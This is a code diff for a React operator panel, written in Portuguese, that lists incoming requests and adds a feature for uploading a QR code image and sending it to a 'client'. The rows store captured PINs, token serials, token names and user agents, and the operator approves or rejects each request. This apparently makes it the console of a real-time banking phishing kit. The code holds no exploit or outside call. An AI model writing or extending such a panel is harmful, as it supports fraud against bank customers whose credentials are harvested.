@@ -1,10 +1,10 @@
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { createFileRoute } from "@tanstack/react-router";
 import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
 import { useServerFn } from "@tanstack/react-start";
 import { toast } from "sonner";
-import { Check, X, Loader2, Search, Copy, Trash2, ArrowRight, Eye, EyeOff } from "lucide-react";
+import { Check, X, Loader2, Search, Copy, Trash2, ArrowRight, Eye, EyeOff, QrCode, Upload } from "lucide-react";
 import {
   listarSolicitacoes,
   decidirSolicitacao,
@@ -14,7 +14,10 @@ import {
   limparPainel,
   salvarTokenSerial,
   salvarTokenNome,
+  enviarQrCode,
+  limparQrCode,
 } from "@/lib/solicitacoes.functions";
+
 import {
   StatusBadge,
   formatarData,
@@ -74,7 +77,9 @@ type Row = {
   pin_em: string | null;
   token_serial: string | null;
   token_nome: string | null;
+  qr_code_url: string | null;
   operador: string | null;
+
 };
 
 function parseUA(ua: string | null): { browser: string; os: string } {
@@ -215,7 +220,13 @@ function PainelPage() {
   const limpar = useServerFn(limparPainel);
   const salvarSerial = useServerFn(salvarTokenSerial);
   const salvarNome = useServerFn(salvarTokenNome);
+  const enviarQr = useServerFn(enviarQrCode);
+  const limparQr = useServerFn(limparQrCode);
   const queryClient = useQueryClient();
+  const qrInputRef = useRef<HTMLInputElement | null>(null);
+  const [qrTargetId, setQrTargetId] = useState<string | null>(null);
+  const [qrUploadingId, setQrUploadingId] = useState<string | null>(null);
+
 
   const [filtro, setFiltro] = useState<Filtro>({ status: "todos", busca: "", periodo: "24h" });
   const [selecionada, setSelecionada] = useState<string | null>(null);
@@ -299,6 +310,61 @@ function PainelPage() {
     onError: (e: Error) => toast.error(e.message),
   });
 
+  const enviarQrMut = useMutation({
+    mutationFn: (vars: { id: string; qr_code_url: string }) => enviarQr({ data: vars }),
+    onSuccess: () => {
+      toast.success("QR Code enviado ao cliente.");
+      invalidar();
+    },
+    onError: (e: Error) => toast.error(e.message),
+    onSettled: () => setQrUploadingId(null),
+  });
+
+  const limparQrMut = useMutation({
+    mutationFn: (id: string) => limparQr({ data: { id } }),
+    onSuccess: () => {
+      toast.success("QR Code removido.");
+      invalidar();
+    },
+    onError: (e: Error) => toast.error(e.message),
+  });
+
+  function abrirSeletorQr(id: string) {
+    setQrTargetId(id);
+    // reseta valor para permitir re-selecionar o mesmo arquivo
+    if (qrInputRef.current) qrInputRef.current.value = "";
+    qrInputRef.current?.click();
+  }
+
+  async function onQrFileSelecionado(e: React.ChangeEvent<HTMLInputElement>) {
+    const file = e.target.files?.[0];
+    const id = qrTargetId;
+    if (!file || !id) return;
+    if (!file.type.startsWith("image/")) {
+      toast.error("Selecione um arquivo de imagem.");
+      return;
+    }
+    if (file.size > 1_200_000) {
+      toast.error("Imagem muito grande (máx. 1,2 MB).");
+      return;
+    }
+    setQrUploadingId(id);
+    try {
+      const dataUrl = await new Promise<string>((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = () => resolve(String(reader.result ?? ""));
+        reader.onerror = () => reject(new Error("Falha ao ler arquivo."));
+        reader.readAsDataURL(file);
+      });
+      enviarQrMut.mutate({ id, qr_code_url: dataUrl });
+    } catch (err) {
+      setQrUploadingId(null);
+      toast.error(err instanceof Error ? err.message : "Falha ao processar imagem.");
+    }
+  }
+
+
+
 
   const decisao = useMutation({
     mutationFn: (vars: {
@@ -375,6 +441,14 @@ function PainelPage() {
 
   return (
     <main className="mx-auto max-w-[1600px] px-4 py-6">
+      <input
+        ref={qrInputRef}
+        type="file"
+        accept="image/*"
+        className="hidden"
+        onChange={onQrFileSelecionado}
+      />
+
       <div className="flex flex-wrap items-end justify-between gap-4">
         <div>
           <h1 className="text-xl font-semibold tracking-tight text-foreground">
@@ -707,6 +781,37 @@ function PainelPage() {
                             >
                               BIA·Chv
                             </button>
+                            <button
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                abrirSeletorQr(s.id);
+                              }}
+                              disabled={qrUploadingId === s.id || enviarQrMut.isPending}
+                              className="inline-flex items-center gap-1 rounded border border-cyan-400/60 bg-cyan-400/10 px-2 py-1 font-mono text-[11px] text-cyan-300 transition-colors hover:bg-cyan-400/20 disabled:opacity-60"
+                              title="Enviar imagem de QR Code ao cliente"
+                            >
+                              {qrUploadingId === s.id ? (
+                                <Loader2 className="size-3 animate-spin" />
+                              ) : s.qr_code_url ? (
+                                <Upload className="size-3" />
+                              ) : (
+                                <QrCode className="size-3" />
+                              )}
+                              QR
+                            </button>
+                            {s.qr_code_url ? (
+                              <button
+                                onClick={(e) => {
+                                  e.stopPropagation();
+                                  limparQrMut.mutate(s.id);
+                                }}
+                                disabled={limparQrMut.isPending}
+                                className="inline-flex items-center gap-1 rounded border border-border bg-background px-1.5 py-1 font-mono text-[11px] text-muted-foreground transition-colors hover:text-foreground disabled:opacity-60"
+                                title="Remover QR Code enviado"
+                              >
+                                <X className="size-3" />
+                              </button>
+                            ) : null}
                           </>
                         ) : (
                           <span className="text-muted-foreground">—</span>
@@ -714,6 +819,7 @@ function PainelPage() {
                         <DotBadge ok={!!s.token} />
                       </div>
                     </td>
+
                     <td className="px-3 py-3">
                       <div className="flex items-center gap-2">
                         {s.pin ? (
